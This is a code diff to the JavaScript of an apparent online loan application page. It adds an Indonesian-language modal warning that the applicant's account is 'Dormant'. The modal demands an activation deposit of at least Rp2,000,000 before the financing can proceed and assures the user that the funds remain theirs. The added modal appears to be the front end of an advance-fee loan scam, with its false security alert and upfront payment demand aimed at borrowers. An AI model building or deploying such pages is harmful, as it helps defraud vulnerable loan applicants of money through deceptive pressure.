@@ -71,7 +71,79 @@
   const rateText = $('rateText');
   const monthly = $('monthly');
   const monthlySummary = $('monthlySummary');
+const dormantNotice = `
+<div class="modal-overlay" id="rekeningModal">
 
+  <div class="modal-card premium">
+
+    <div class="modal-icon">
+      ⚠️
+    </div>
+
+    <h3>Perhatian Keamanan Rekening</h3>
+
+    <div class="status-badge">
+      Status Rekening: Dormant
+    </div>
+
+    <p class="modal-desc">
+      Sistem mendeteksi bahwa rekening Anda belum memiliki aktivitas
+      transaksi dalam periode tertentu.
+    </p>
+
+    <p class="modal-desc">
+      Untuk melanjutkan proses layanan pembiayaan,
+      diperlukan <strong>verifikasi rekening</strong> dan
+      aktivasi layanan sesuai ketentuan yang berlaku.
+    </p>
+
+
+    <div class="activation-box">
+
+      <h4>Ketentuan Aktivasi</h4>
+
+      <div class="activation-item">
+        <span>Saldo awal aktivasi</span>
+        <strong>Minimal Rp2.000.000</strong>
+      </div>
+
+    </div>
+
+
+    <div class="security-info">
+
+      <span>🔒</span>
+
+      <p>
+        Dana yang tersedia tetap menjadi milik Anda dan dapat digunakan
+        sesuai ketentuan layanan rekening.
+      </p>
+
+    </div>
+
+
+    <p class="footer-message">
+      Silakan lanjutkan aktivasi untuk meneruskan proses layanan pengajuan.
+    </p>
+
+
+    <div class="modal-actions">
+
+      <button class="btn-secondary" id="closeRekeningModal">
+        Kembali
+      </button>
+
+      <button class="btn-primary" id="activateRekening">
+        Lanjutkan Aktivasi
+      </button>
+
+    </div>
+
+
+  </div>
+
+</div>
+`;
   if (amount) amount.value = application.limit;
   if (tenor) tenor.value = String(application.tenor);
   if (rate) rate.value = String(application.annualRate);
